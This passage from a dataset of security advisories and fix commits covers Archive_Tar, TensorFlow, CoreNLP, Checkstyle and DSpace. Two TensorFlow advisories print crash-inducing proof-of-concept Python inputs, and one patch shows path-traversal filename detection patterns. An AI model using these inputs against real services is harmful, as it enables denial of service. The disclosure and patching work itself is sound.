https:\/\/github.com\/pear\/Archive_Tar\/issues\/33","published_date":"2021-04-22","chain_len":1,"project":"https:\/\/github.com\/pear\/Archive_Tar","commit_href":"https:\/\/github.com\/pear\/Archive_Tar\/commit\/0670a05fdab997036a3fc3ef113b8f5922e574da","commit_sha":"0670a05fdab997036a3fc3ef113b8f5922e574da","patch":"SINGLE","chain_ord":"['0670a05fdab997036a3fc3ef113b8f5922e574da']","before_first_fix_commit":"{'bbb4f10f71a1da2715ec6d9a683f4f23c507a49b'}","last_fix_commit":"0670a05fdab997036a3fc3ef113b8f5922e574da","chain_ord_pos":1.0,"commit_datetime":"11\/19\/2020, 08:52:43","message":"Fixes #33 - ensure we catch additional malicious\/crafted filenames","author":"Michiel Rook","comments":null,"stats":"{'additions': 4, 'deletions': 4, 'total': 8}","files":"{'Archive\/Tar.php': {'additions': 4, 'deletions': 4, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pear\/Archive_Tar\/raw\/0670a05fdab997036a3fc3ef113b8f5922e574da\/Archive%2FTar.php', 'patch': '@@ -1730,7 +1730,7 @@ public function _readHeader($v_binary_data, &$v_header)\\n \\n         \/\/ ----- Extract the properties\\n         $v_header[\\'filename\\'] = rtrim($v_data[\\'filename\\'], \"\\\\0\");\\n-        if ($this->_maliciousFilename($v_header[\\'filename\\'])) {\\n+        if ($this->_isMaliciousFilename($v_header[\\'filename\\'])) {\\n             $this->_error(\\n                 \\'Malicious .tar detected, file \"\\' . $v_header[\\'filename\\'] .\\n                 \\'\" will not install in desired directory tree\\'\\n@@ -1800,9 +1800,9 @@ private function _tarRecToSize($tar_size)\\n      *\\n      * @return bool\\n      *\/\\n-    private function _maliciousFilename($file)\\n+    private function _isMaliciousFilename($file)\\n     {\\n-        if (strpos($file, \\'phar:\/\/\\') === 0) {\\n+        if (strpos($file, \\':\/\/\\') !== false) {\\n             return true;\\n         }\\n         if (strpos($file, \\'..\/\\') !== false || strpos($file, \\'..\\\\\\\\\\') !== false) {\\n@@ -1838,7 +1838,7 @@ public function _readLongHeader(&$v_header)\\n \\n         $v_filename = rtrim(substr($v_filename, 0, $v_filesize), \"\\\\0\");\\n         $v_header[\\'filename\\'] = $v_filename;\\n-        if ($this->_maliciousFilename($v_filename)) {\\n+        if ($this->_isMaliciousFilename($v_filename)) {\\n             $this->_error(\\n                 \\'Malicious .tar detected, file \"\\' . $v_filename .\\n                 \\'\" will not install in desired directory tree\\''}}","message_norm":"fixes #33 - ensure we catch additional malicious\/crafted filenames","language":"en","entities":"[('fixes', 'ACTION', ''), ('#33', 'ISSUE', ''), ('ensure', 'ACTION', ''), ('malicious', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['Archive\/Tar.php'])","num_files":1.0},{"index":965,"vuln_id":"GHSA-75f6-78jr-4656","cwe_id":"{'CWE-476'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3'}","dataset":"osv","summary":"Null pointer dereference in `EditDistance` ### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.EditDistance`: \n    \n```python\nimport tensorflow as tf\n\nhypothesis_indices = tf.constant([247, 247, 247], shape=[1, 3], dtype=tf.int64)\nhypothesis_values = tf.constant([-9.9999], shape=[1], dtype=tf.float32)\nhypothesis_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\ntruth_indices = tf.constant([], shape=[0, 3], dtype=tf.int64)\ntruth_values = tf.constant([], shape=[0], dtype=tf.float32)\ntruth_shape = tf.constant([0, 0, 0], shape=[3], dtype=tf.int64)\n\ntf.raw_ops.EditDistance(\n    hypothesis_indices=hypothesis_indices, hypothesis_values=hypothesis_values,\n    hypothesis_shape=hypothesis_shape, truth_indices=truth_indices,\n    truth_values=truth_values, truth_shape=truth_shape, normalize=True)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/79865b542f9ffdc9caeb255631f7c56f1d4b6517\/tensorflow\/core\/kernels\/edit_distance_op.cc#L103-L159) has incomplete validation of the input parameters.\n\nIn the above scenario, an attacker causes an allocation of an empty tensor for the output:\n\n```cc\nOP_REQUIRES_OK(ctx, ctx->allocate_output(\"output\", output_shape, &output));\nauto output_t = output->flat<float>();\noutput_t.setZero();\n```\n\nBecause `output_shape` has 0 elements, the result of `output->flat<T>()` has an empty buffer, so calling `setZero` would result in a null dereference.\n\n### Patches\nWe have patched the issue in GitHub commit [f4c364a5d6880557f6f5b6eb5cee2c407f0186b3](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3","commit_sha":"f4c364a5d6880557f6f5b6eb5cee2c407f0186b3","patch":"SINGLE","chain_ord":"['f4c364a5d6880557f6f5b6eb5cee2c407f0186b3']","before_first_fix_commit":"{'79865b542f9ffdc9caeb255631f7c56f1d4b6517'}","last_fix_commit":"f4c364a5d6880557f6f5b6eb5cee2c407f0186b3","chain_ord_pos":1.0,"commit_datetime":"05\/05\/2021, 01:06:03","message":"Fix multiple issues in EditDistance\n\nPiperOrigin-RevId: 372033948\nChange-Id: Ieb957c29894af05bdfeb1a0402fced808dfcfd7b","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 47, 'deletions': 0, 'total': 47}","files":"{'tensorflow\/core\/kernels\/edit_distance_op.cc': {'additions': 47, 'deletions': 0, 'changes': 47, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f4c364a5d6880557f6f5b6eb5cee2c407f0186b3\/tensorflow%2Fcore%2Fkernels%2Fedit_distance_op.cc', 'patch': '@@ -64,6 +64,12 @@ Status ValidateShapes(OpKernelContext* ctx, const Tensor& hypothesis_indices,\\n     return errors::InvalidArgument(\\n         \"truth_shape should be a vector, but got shape: \",\\n         truth_shape.shape().DebugString());\\n+  if (hypothesis_values.NumElements() != hypothesis_indices.dim_size(0))\\n+    return errors::InvalidArgument(\\n+        \"Expected hypothesis_values.NumElements == \"\\n+        \"#rows(hypothesis_indices), their shapes are: \",\\n+        hypothesis_values.shape().DebugString(), \" and \",\\n+        hypothesis_indices.shape().DebugString());\\n   if (hypothesis_shape.NumElements() != hypothesis_indices.dim_size(1))\\n     return errors::InvalidArgument(\\n         \"Expected hypothesis_shape.NumElements == \"\\n@@ -75,6 +81,12 @@ Status ValidateShapes(OpKernelContext* ctx, const Tensor& hypothesis_indices,\\n         \"Input SparseTensors must have rank at least 2, but truth_shape \"\\n         \"rank is: \",\\n         truth_shape.NumElements());\\n+  if (truth_values.NumElements() != truth_indices.dim_size(0))\\n+    return errors::InvalidArgument(\\n+        \"Expected truth_values.NumElements == \"\\n+        \"#rows(truth_indices), their shapes are: \",\\n+        truth_values.shape().DebugString(), \" and \",\\n+        truth_indices.shape().DebugString());\\n   if (truth_shape.NumElements() != truth_indices.dim_size(1))\\n     return errors::InvalidArgument(\\n         \"Expected truth_shape.NumElements == \"\\n@@ -153,6 +165,11 @@ class EditDistanceOp : public OpKernel {\\n       output_shape.AddDim(std::max(hypothesis_st_shape.dim_size(d),\\n                                    truth_st_shape.dim_size(d)));\\n     }\\n+    const auto output_elements = output_shape.num_elements();\\n+    OP_REQUIRES(\\n+        ctx, output_elements > 0,\\n+        errors::InvalidArgument(\"Got output shape \", output_shape.DebugString(),\\n+                                \" which has 0 elements\"));\\n \\n     Tensor* output = nullptr;\\n     OP_REQUIRES_OK(ctx, ctx->allocate_output(\"output\", output_shape, &output));\\n@@ -185,6 +202,12 @@ class EditDistanceOp : public OpKernel {\\n       if (g_truth == g_hypothesis) {\\n         auto loc = std::inner_product(g_truth.begin(), g_truth.end(),\\n                                       output_strides.begin(), int64{0});\\n+        OP_REQUIRES(\\n+            ctx, loc < output_elements,\\n+            errors::Internal(\"Got an inner product \", loc,\\n+                             \" which would require in writing to outside of \"\\n+                             \"the buffer for the output tensor (max elements \",\\n+                             output_elements, \")\"));\\n         output_t(loc) =\\n             gtl::LevenshteinDistance<T>(truth_seq, hypothesis_seq, cmp);\\n         if (normalize_) output_t(loc) \/= truth_seq.size();\\n@@ -194,6 +217,12 @@ class EditDistanceOp : public OpKernel {\\n       } else if (g_truth > g_hypothesis) {  \/\/ zero-length truth\\n         auto loc = std::inner_product(g_hypothesis.begin(), g_hypothesis.end(),\\n                                       output_strides.begin(), int64{0});\\n+        OP_REQUIRES(\\n+            ctx, loc < output_elements,\\n+            errors::Internal(\"Got an inner product \", loc,\\n+                             \" which would require in writing to outside of \"\\n+                             \"the buffer for the output tensor (max elements \",\\n+                             output_elements, \")\"));\\n         output_t(loc) = hypothesis_seq.size();\\n         if (normalize_ && output_t(loc) != 0.0f) {\\n           output_t(loc) = std::numeric_limits<float>::infinity();\\n@@ -202,6 +231,12 @@ class EditDistanceOp : public OpKernel {\\n       } else {  \/\/ zero-length hypothesis\\n         auto loc = std::inner_product(g_truth.begin(), g_truth.end(),\\n                                       output_strides.begin(), int64{0});\\n+        OP_REQUIRES(\\n+            ctx, loc < output_elements,\\n+            errors::Internal(\"Got an inner product \", loc,\\n+                             \" which would require in writing to outside of \"\\n+                             \"the buffer for the output tensor (max elements \",\\n+                             output_elements, \")\"));\\n         output_t(loc) = (normalize_) ? 1.0 : truth_seq.size();\\n         ++truth_iter;\\n       }\\n@@ -212,6 +247,12 @@ class EditDistanceOp : public OpKernel {\\n       auto hypothesis_seq = hypothesis_j.values<T>();\\n       auto loc = std::inner_product(g_hypothesis.begin(), g_hypothesis.end(),\\n                                     output_strides.begin(), int64{0});\\n+      OP_REQUIRES(\\n+          ctx, loc < output_elements,\\n+          errors::Internal(\"Got an inner product \", loc,\\n+                           \" which would require in writing to outside of the \"\\n+                           \"buffer for the output tensor (max elements \",\\n+                           output_elements, \")\"));\\n       output_t(loc) = hypothesis_seq.size();\\n       if (normalize_ && output_t(loc) != 0.0f) {\\n         output_t(loc) = std::numeric_limits<float>::infinity();\\n@@ -224,6 +265,12 @@ class EditDistanceOp : public OpKernel {\\n       auto truth_seq = truth_i.values<T>();\\n       auto loc = std::inner_product(g_truth.begin(), g_truth.end(),\\n                                     output_strides.begin(), int64{0});\\n+      OP_REQUIRES(\\n+          ctx, loc < output_elements,\\n+          errors::Internal(\"Got an inner product \", loc,\\n+                           \" which would require in writing to outside of the \"\\n+                           \"buffer for the output tensor (max elements \",\\n+                           output_elements, \")\"));\\n       output_t(loc) = (normalize_) ? 1.0 : truth_seq.size();\\n       ++truth_iter;\\n     }'}}","message_norm":"fix multiple issues in editdistance\n\npiperorigin-revid: 372033948\nchange-id: ieb957c29894af05bdfeb1a0402fced808dfcfd7b","language":"en","entities":"[('fix', 'ACTION', ''), ('issues', 'FLAW', ''), ('372033948', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/edit_distance_op.cc'])","num_files":1.0},{"index":971,"vuln_id":"GHSA-75vw-3m5v-fprh","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/stanfordnlp\/corenlp\/commit\/1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd'}","dataset":"osv","summary":"corenlp is vulnerable to Improper Restriction of XML External Entity Reference corenlp is vulnerable to Improper Restriction of XML External Entity Reference","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/stanfordnlp\/corenlp","commit_href":"https:\/\/github.com\/stanfordnlp\/corenlp\/commit\/1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd","commit_sha":"1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd","patch":"SINGLE","chain_ord":"['1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd']","before_first_fix_commit":"{'820192ce1ad1062057cf6abcb359cd635988bf63'}","last_fix_commit":"1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd","chain_ord_pos":1.0,"commit_datetime":"01\/16\/2022, 06:10:35","message":"Fix XML schema vulnerability","author":"Haxatron","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'src\/edu\/stanford\/nlp\/util\/XMLUtils.java': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/stanfordnlp\/CoreNLP\/raw\/1940ffb938dc4f3f5bc5f2a2fd8b35aabbbae3dd\/src%2Fedu%2Fstanford%2Fnlp%2Futil%2FXMLUtils.java', 'patch': '@@ -302,6 +302,7 @@ public static DocumentBuilder getValidatingXmlParser(File schemaFile) {\\n       DocumentBuilderFactory dbf = safeDocumentBuilderFactory();\\n \\n       SchemaFactory factory = SchemaFactory.newInstance(XMLConstants.W3C_XML_SCHEMA_NS_URI);\\n+      factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\\n       Schema schema = factory.newSchema(schemaFile);\\n       dbf.setSchema(schema);'}}","message_norm":"fix xml schema vulnerability","language":"ro","entities":"[('fix', 'ACTION', ''), ('vulnerability', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/edu\/stanford\/nlp\/util\/XMLUtils.java'])","num_files":1.0},{"index":973,"vuln_id":"GHSA-763g-fqq7-48wg","cwe_id":"{'CWE-611'}","score":5.3,"chain":"{'https:\/\/github.com\/checkstyle\/checkstyle\/commit\/c46a16d177e6797895b195c288ae9a9a096254b8'}","dataset":"osv","summary":"XML external entity (XXE) processing ('external-parameter-entities' feature was not fully disabled)) Due to an incomplete fix for [CVE-2019-9658](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2019-9658), checkstyle was still vulnerable to XML External Entity (XXE) Processing.\n\n### Impact\n\n#### User: Build Maintainers\n\nThis vulnerability probably doesn't impact Maven\/Gradle users as, in most cases, these builds are processing files that are trusted, or pre-vetted by a pull request reviewer before being run on internal CI infrastructure.\n\n#### User: Static Analysis as a Service\n\nIf you operate a site\/service that parses \"untrusted\" Checkstyle XML configuration files, you are vulnerable to this and should patch.\n\nNote from the discoverer of the original CVE-2019-9658:\n\n> While looking at a few companies that run Checkstyle\/PMD\/ect... as a service I notice that it's a common pattern to run the static code analysis tool inside of a Docker container with the following flags:\n> ```\n> --net=none \\\n> --privileged=false \\\n> --cap-drop=ALL\n> ```\n> Running the analysis in Docker has the advantage that there should be no sensitive local file information that XXE can exfiltrate from the container. Additionally, these flags prevent vulnerabilities in static analysis tools like Checkstyle from being used to exfiltrate data via XXE or to perform SSRF.\n> \\- [Jonathan Leitschuh](https:\/\/twitter.com\/jlleitschuh)\n\n### Patches\n_Has the problem been patched? What versions should users upgrade to?_\n\nPatched, will be released with version 8.29 at 26 Jan 2020.\n\n### Workarounds\n_Is there a way for users to fix or remediate the vulnerability without upgrading?_\n\nNo workaround are available\n\n### References\n\n - [CWE-611: Improper Restriction of XML External Entity Reference](https:\/\/cwe.mitre.org\/data\/definitions\/611.html)\n - GitHub Issue https:\/\/github.com\/checkstyle\/checkstyle\/issues\/7468\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n* Open an issue in https:\/\/github.com\/checkstyle\/checkstyle\/issues","published_date":"2020-01-31","chain_len":1,"project":"https:\/\/github.com\/checkstyle\/checkstyle","commit_href":"https:\/\/github.com\/checkstyle\/checkstyle\/commit\/c46a16d177e6797895b195c288ae9a9a096254b8","commit_sha":"c46a16d177e6797895b195c288ae9a9a096254b8","patch":"SINGLE","chain_ord":"['c46a16d177e6797895b195c288ae9a9a096254b8']","before_first_fix_commit":"{'dfed7949c3714dceb0318e4381f00e7fb5d5dfe3'}","last_fix_commit":"c46a16d177e6797895b195c288ae9a9a096254b8","chain_ord_pos":1.0,"commit_datetime":"01\/19\/2020, 01:32:28","message":"Issue #7468: disable 'external-parameter-entities' feature by default","author":"Roman Ivanov","comments":null,"stats":"{'additions': 4, 'deletions': 0, 'total': 4}","files":"{'src\/main\/java\/com\/puppycrawl\/tools\/checkstyle\/XmlLoader.java': {'additions': 4, 'deletions': 0, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/checkstyle\/checkstyle\/raw\/c46a16d177e6797895b195c288ae9a9a096254b8\/src%2Fmain%2Fjava%2Fcom%2Fpuppycrawl%2Ftools%2Fcheckstyle%2FXmlLoader.java', 'patch': '@@ -124,6 +124,9 @@ public static final class LoadExternalDtdFeatureProvider {\\n         \/** Feature that enables including external general entities in XML files. *\/\\n         public static final String EXTERNAL_GENERAL_ENTITIES =\\n                 \"http:\/\/xml.org\/sax\/features\/external-general-entities\";\\n+        \/** Feature that enables including external parameter entities in XML files. *\/\\n+        public static final String EXTERNAL_PARAMETER_ENTITIES =\\n+                \"http:\/\/xml.org\/sax\/features\/external-parameter-entities\";\\n \\n         \/** Stop instances being created. **\/\\n         private LoadExternalDtdFeatureProvider() {\\n@@ -146,6 +149,7 @@ public static void setFeaturesBySystemProperty(SAXParserFactory factory)\\n \\n             factory.setFeature(LOAD_EXTERNAL_DTD, enableExternalDtdLoad);\\n             factory.setFeature(EXTERNAL_GENERAL_ENTITIES, enableExternalDtdLoad);\\n+            factory.setFeature(EXTERNAL_PARAMETER_ENTITIES, enableExternalDtdLoad);\\n         }\\n \\n     }'}}","message_norm":"issue #7468: disable 'external-parameter-entities' feature by default","language":"fr","entities":"[('#7468', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/main\/java\/com\/puppycrawl\/tools\/checkstyle\/XmlLoader.java'])","num_files":1.0},{"index":974,"vuln_id":"GHSA-763j-q7wv-vf3m","cwe_id":"{'CWE-601'}","score":7.1,"chain":"{'https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9', 'https:\/\/github.com\/DSpace\/DSpace\/commit\/5f72424a478f59061dcc516b866dcc687bc3f9de'}","dataset":"osv","summary":"JSPUI's controlled vocabulary feature vulnerable to Open Redirect before v6.4 and v5.11 ### Impact\nThe JSPUI controlled vocabulary servlet is vulnerable to an open redirect attack, where an attacker can craft a malicious URL that looks like a legitimate DSpace\/repository URL.  When that URL is clicked by the target, it redirects them to a site of the attacker's choice.\n\n_This vulnerability does NOT impact the XMLUI or 7.x._\n\n### Patches\n_DSpace 6.x:_\n* Fixed in 6.x via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9\n* 6.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9.patch (may be applied manually if an immediate upgrade to 6.4 or above is not possible)\n\n_DSpace 5.x:_\n* Fixed in 5.x via commit: https:\/\/github.com\/DSpace\/DSpace\/commit\/5f72424a478f59061dcc516b866dcc687bc3f9de\n* 5.x patch file: https:\/\/github.com\/DSpace\/DSpace\/commit\/5f72424a478f59061dcc516b866dcc687bc3f9de.patch (may be applied manually if an immediate upgrade to 5.11 or 6,4 or above is not possible)\n\n#### Apply the patch to your DSpace\nIf at all possible, we recommend upgrading your DSpace site based on the upgrade instructions. However, if you are unable to do so, you can manually apply the above patches as follows:\n1. Download the appropriate patch file to the machine where DSpace is running\n2. From the `[dspace-src]` folder, apply the patch, e.g. `git apply [name-of-file].patch`\n3. Now, update your DSpace site (based loosely on the Upgrade instructions). This generally involves three steps:\n    1. Rebuild DSpace, e.g. `mvn -U clean package`  (This will recompile all DSpace code)\n    2. Redeploy DSpace, e.g. `ant update`  (This will copy all updated WARs \/ configs to your installation directory). Depending on your setup you also may need to copy the updated WARs over to your Tomcat webapps folder.\n    3. Restart Tomcat\n\n### References\nDiscovered and reported by Johannes Moritz of Ripstech.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Email us at security@dspace.org","published_date":"2022-08-06","chain_len":2,"project":"https:\/\/github.com\/DSpace\/DSpace","commit_href":"https:\/\/github.com\/DSpace\/DSpace\/commit\/f7758457b7ec3489d525e39aa753cc70809d9ad9","commit_sha":"f7758457b7ec3489d525e39aa753cc70809d9ad9","patch":"MULTI","chain_ord":"['f7758457b7ec3489d525e39aa753cc70809d9ad9', '5f72424a478f59061dcc516b866dcc687bc3f9de']","before_first_fix_commit":"{'3b0cdee734d0ee3f2c2cbdcc07c1135c1c048be8'}","last_fix_commit":"5f72424a478f59061dcc516b866dcc687bc3f9de","chain_ord_pos":1.0,"commit_datetime":"04\/08\/2020, 00:48:56","message":"[DS-4133] Improve URL handling in Controlled Vocab JSPUI servlet","author":"Kim Shepherd","comments":null,"stats":"{'additions': 10, 'deletions': 2, 'total': 12}","files":"{'dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java': {'additions': 10, 'deletions': 2, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/DSpace\/DSpace\/raw\/f7758457b7ec3489d525e39aa753cc70809d9ad9\/dspace-jspui%2Fsrc%2Fmain%2Fjava%2Forg%2Fdspace%2Fapp%2Fwebui%2Fservlet%2FControlledVocabularyServlet.java', 'patch': '@@ -14,6 +14,7 @@\\n import javax.servlet.http.HttpServletRequest;\\n import javax.servlet.http.HttpServletResponse;\\n \\n+import org.apache.log4j.Logger;\\n import org.dspace.authorize.AuthorizeException;\\n import org.dspace.core.Context;\\n \\n@@ -25,8 +26,8 @@\\n  *\/\\n public class ControlledVocabularyServlet extends DSpaceServlet\\n {\\n-    \/\/ private static Logger log =\\n-    \/\/ Logger.getLogger(ControlledVocabularyServlet.class);\\n+    private static Logger log =\\n+    Logger.getLogger(ControlledVocabularyServlet.class);\\n \\n     protected void doDSGet(Context context, HttpServletRequest request,\\n             HttpServletResponse response) throws ServletException, IOException,\\n@@ -37,6 +38,13 @@ protected void doDSGet(Context context, HttpServletRequest request,\\n         String filter = \"\";\\n         String callerUrl = request.getParameter(\"callerUrl\");\\n \\n+        \/\/ callerUrl must starts with URL outside DSpace request context path\\n+        if(!callerUrl.startsWith(request.getContextPath())) {\\n+            log.error(\"Controlled vocabulary caller URL would result in redirect outside DSpace web app: \" + callerUrl + \". Rejecting request with 400 Bad Request.\");\\n+            response.sendError(400, \"The caller URL must be within the DSpace base URL of \" + request.getContextPath());\\n+            return;\\n+        }\\n+\\n         if (request.getParameter(\"ID\") != null)\\n         {\\n             ID = request.getParameter(\"ID\");'}}","message_norm":"[ds-4133] improve url handling in controlled vocab jspui servlet","language":"en","entities":"[('improve', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['dspace-jspui\/src\/main\/java\/org\/dspace\/app\/webui\/servlet\/ControlledVocabularyServlet.java'])","num_files":1.0},{"index":983,"vuln_id":"GHSA-772j-h9xw-ffp5","cwe_id":"{'CWE-843'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025'}","dataset":"osv","summary":"CHECK-fail in SparseCross due to type confusion ### Impact\nThe API of `tf.raw_ops.SparseCross` allows combinations which would result in a `CHECK`-failure and denial of service:\n\n```python\nimport tensorflow as tf\n\nhashed_output = False\nnum_buckets = 1949315406\nhash_key = 1869835877\nout_type = tf.string \ninternal_type = tf.string\n\nindices_1 = tf.constant([0, 6], shape=[1, 2], dtype=tf.int64)\nindices_2 = tf.constant([0, 0], shape=[1, 2], dtype=tf.int64)\nindices = [indices_1, indices_2]\n\nvalues_1 = tf.constant([0], dtype=tf.int64)\nvalues_2 = tf.constant([72], dtype=tf.int64)\nvalues = [values_1, values_2]\n\nbatch_size = 4\nshape_1 = tf.constant([4, 122], dtype=tf.int64)\nshape_2 = tf.constant([4, 188], dtype=tf.int64)\nshapes = [shape_1, shape_2]\n\ndense_1 = tf.constant([188, 127, 336, 0], shape=[4, 1], dtype=tf.int64)\ndense_2 = tf.constant([341, 470, 470, 470], shape=[4, 1], dtype=tf.int64)\ndense_3 = tf.constant([188, 188, 341, 922], shape=[4, 1], dtype=tf.int64)\ndenses = [dense_1, dense_2, dense_3]\n\ntf.raw_ops.SparseCross(indices=indices, values=values, shapes=shapes, dense_inputs=denses, hashed_output=hashed_output,\n                       num_buckets=num_buckets, hash_key=hash_key, out_type=out_type, internal_type=internal_type)\n```\n\nThe above code will result in a `CHECK` fail in [`tensor.cc`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d\/tensorflow\/core\/framework\/tensor.cc#L670-L675):\n\n```cc\nvoid Tensor::CheckTypeAndIsAligned(DataType expected_dtype) const {\n  CHECK_EQ(dtype(), expected_dtype)\n      << \" \" << DataTypeString(expected_dtype) << \" expected, got \"\n      << DataTypeString(dtype());\n  ...\n}\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d\/tensorflow\/core\/kernels\/sparse_cross_op.cc#L114-L116) is tricked to consider a tensor of type `tstring` which in fact contains integral elements:\n\n```cc\n  if (DT_STRING == values_.dtype())\n      return Fingerprint64(values_.vec<tstring>().data()[start + n]);\n  return values_.vec<int64>().data()[start + n];\n```\n\nFixing the type confusion by preventing mixing `DT_STRING` and `DT_INT64` types solves this issue.\n\n### Patches\nWe have patched the issue in GitHub commit [b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025","commit_sha":"b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025","patch":"SINGLE","chain_ord":"['b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025']","before_first_fix_commit":"{'3d782b7d47b1bf2ed32bd4a246d6d6cadc4c903d'}","last_fix_commit":"b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025","chain_ord_pos":1.0,"commit_datetime":"04\/15\/2021, 20:03:19","message":"Fix `tf.raw_ops.SparseCross` failing CHECK.\n\nPiperOrigin-RevId: 368701671\nChange-Id: Id805729dd9ba0bda36e4bb309408129b55fb649d","author":"Amit Patankar","comments":null,"stats":"{'additions': 48, 'deletions': 7, 'total': 55}","files":"{'tensorflow\/core\/kernels\/sparse_cross_op.cc': {'additions': 48, 'deletions': 7, 'changes': 55, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/b1cc5e5a50e7cee09f2c6eb48eb40ee9c4125025\/tensorflow%2Fcore%2Fkernels%2Fsparse_cross_op.cc', 'patch': '@@ -27,6 +27,7 @@ limitations under the License.\\n #include \"tensorflow\/core\/framework\/tensor.h\"\\n #include \"tensorflow\/core\/framework\/tensor_shape.h\"\\n #include \"tensorflow\/core\/framework\/types.h\"\\n+#include \"tensorflow\/core\/framework\/types.pb.h\"\\n #include \"tensorflow\/core\/lib\/core\/stringpiece.h\"\\n #include \"tensorflow\/core\/lib\/strings\/str_util.h\"\\n #include \"tensorflow\/core\/platform\/fingerprint.h\"\\n@@ -460,10 +461,19 @@ int64 CalculateBatchSize(const OpInputList& shapes_list_in,\\n Status ValidateInput(const OpInputList& indices_list_in,\\n                      const OpInputList& values_list_in,\\n                      const OpInputList& shapes_list_in,\\n-                     const OpInputList& dense_list_in) {\\n+                     const OpInputList& dense_list_in,\\n+                     const DataType& internal_type) {\\n   const auto size = indices_list_in.size();\\n+  \/\/ Only perform internal_type check for SparseCrossOp.\\n+  \/\/ Check if the internal_type is not invalid before doing so.\\n+  bool check_type = internal_type != DT_INVALID;\\n   \/\/ Validates indices_list_in OpInputList.\\n   for (int i = 0; i < size; i++) {\\n+    if (check_type && indices_list_in[i].dtype() != DT_INT64) {\\n+      return errors::InvalidArgument(\"Input indices should be of type \",\\n+                                     DT_INT64, \" but received \",\\n+                                     indices_list_in[i].dtype());\\n+    }\\n     if (!TensorShapeUtils::IsMatrix(indices_list_in[i].shape())) {\\n       return errors::InvalidArgument(\\n           \"Input indices should be a matrix but received shape \",\\n@@ -482,6 +492,14 @@ Status ValidateInput(const OpInputList& indices_list_in,\\n                                    values_list_in.size());\\n   }\\n   for (int i = 0; i < size; i++) {\\n+    \/\/ Make sure to avoid the expected type to be string, but input values to be\\n+    \/\/ int64.\\n+    if (check_type && internal_type == DT_STRING &&\\n+        values_list_in[i].dtype() == DT_INT64) {\\n+      return errors::InvalidArgument(\"Input values should be of internal type \",\\n+                                     internal_type, \" but received 